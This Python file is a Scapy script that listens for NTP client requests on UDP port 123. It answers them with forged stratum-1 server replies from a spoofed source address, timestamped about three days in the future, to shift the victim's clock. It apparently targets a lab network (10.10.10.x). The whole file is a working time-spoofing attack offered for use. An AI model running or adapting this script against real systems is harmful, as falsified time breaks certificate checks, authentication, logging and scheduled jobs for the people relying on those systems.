from scapy.all import IP, UDP, NTP, send, sniff
from scapy.layers.ntp import NTP
import time

server_ip = "10.10.10.12"
dest_ip = "10.10.10.10"
ref_timestamp = time.time() + 259200

def send_ntp(server, packetsrc, ref_timestamp):
    ntp_packet = NTP()

    ntp_packet.leap = 00
    ntp_packet.ref = ref_timestamp
    ntp_packet.version = 3
    ntp_packet.ref_id = b"\x00\x00\x00\x00"
    ntp_packet.delay = 1
    ntp_packet.dispersion = 16
    ntp_packet.precision = 1
    ntp_packet.poll = 4
    ntp_packet.mode = 4
    ntp_packet.id = server
    ntp_packet.stratum = 1
    ntp_packet.orig = time.time() + 259201
    ntp_packet.recv = time.time() + 259201
    ntp_packet.sent =time.time() + 259201

    ip_packet = IP(src=server, dst=dest_ip)
    udp_packet = UDP(dport=123, sport=123)

    print("Packet before sending")
    ntp_packet.show()
    ip_packet.show()
    udp_packet.show()

    send(ip_packet/udp_packet/ntp_packet, verbose=True)

def ntp_request(packet):
    ntp_layer = packet.getlayer(NTP)
    if ntp_layer and ntp_layer.mode == 3:
        print("Here is the ref_id")
        print(ntp_layer.ref_id)
        print("here is the ref_time")
        print(ntp_layer.ref)
        send_ntp(server_ip, packet[IP].src, ref_timestamp)

if __name__ == "__main__":
    sniff(filter="udp and port 123", prn=ntp_request)
